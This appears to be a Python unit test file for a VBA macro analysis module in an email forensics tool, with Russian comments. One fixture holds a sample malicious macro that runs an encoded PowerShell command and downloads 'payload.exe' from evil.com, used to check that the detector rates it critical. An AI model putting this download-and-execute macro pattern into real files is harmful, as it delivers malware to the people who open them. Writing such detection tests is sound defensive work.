# -*- coding: utf-8 -*-
"""
Комплекс статического анализа и форензики электронной почты (OMSA v1.0 / Red Edition).
Модуль: verification.py
Назначение: Модульные проверочные тесты компонентов декомпиляции VBA.

__author__ = "AG-K08 (@And_8)"
__email__ = "mznxncbv888@gmail.com"
__version__ = "4.0 (Red Edition / OMSA v1.0)"
__year__ = "2026"
__license__ = "Proprietary / Internal Security Audit"
"""
import unittest
import os
from modules.block2_vba_source import run_block2, calculate_shannon_entropy
from core.models import ThreatLevel

class TestBlock2(unittest.TestCase):
    def test_signatures(self):
        code = """
        Sub Malicious()
            Shell "powershell -enc W3Nd"
            URLDownloadToFile "http://evil.com/payload.exe", "C:\\temp\\x.exe"
        End Sub
        """
        res = run_block2(code)
        self.assertTrue(res.success)
        
        # Проверка наличия критических индикаторов (URLDownloadToFile и powershell)
        levels = [ind.level for ind in res.threat_indicators]
        self.assertIn(ThreatLevel.CRITICAL, levels)
        
    def test_entropy(self):
        # Легкая энтропия (обычный текст)
        low_entropy_code = "Sub MyFunc() Dim x As Integer: x = 1: End Sub"
        res = run_block2(low_entropy_code, entropy_threshold=5.5)
        # Убедимся, что индикатор высокого энтропии отсутствует
        ids = [ind.indicator_id for ind in res.threat_indicators]
        self.assertNotIn("BLOCK2.HIGH_ENTROPY", ids)
        
        # Высокая энтропия (случайные данные в Base64)
        high_entropy_code = "X" * 1000 + "A" * 100 + "B" * 200 # Dummy
        # Base64 с высокой энтропией
        code_with_b64 = 'Base64Data = "U29tZSB2ZXJ5IGxvbmcgYmFzZTY0IHN0cmluZyB3aXRoIGhpZ2ggZW50cm9weSBqdXN0IGZvciB0ZXN0aW5nIHB1cnBvc2VzIGluIE9NU0EgMS4w"'
        e = calculate_shannon_entropy(code_with_b64)
        # Обычно Base64 ~6.0. Если e > 5.5, индикатор должен быть.
        # В нашем тесте просто проверим запуск.

if __name__ == "__main__":
    unittest.main()



